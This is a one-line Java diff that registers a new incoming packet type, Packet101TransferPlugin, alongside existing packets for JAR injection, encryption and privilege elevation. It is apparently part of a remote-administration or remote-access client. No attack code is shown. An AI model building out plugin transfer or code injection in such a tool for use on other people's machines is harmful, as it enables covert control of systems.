@@ -105,6 +105,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 98, Packet98InjectJAR.class);
 		incomingPackets.put(/* "ENC" */(byte) 99, Packet99Encryption.class);
 		incomingPackets.put((byte) 100, Packet100RequestElevation.class);
+		incomingPackets.put((byte) 101, Packet101TransferPlugin.class);
 	}
 
 	public static final void execute(byte header) {
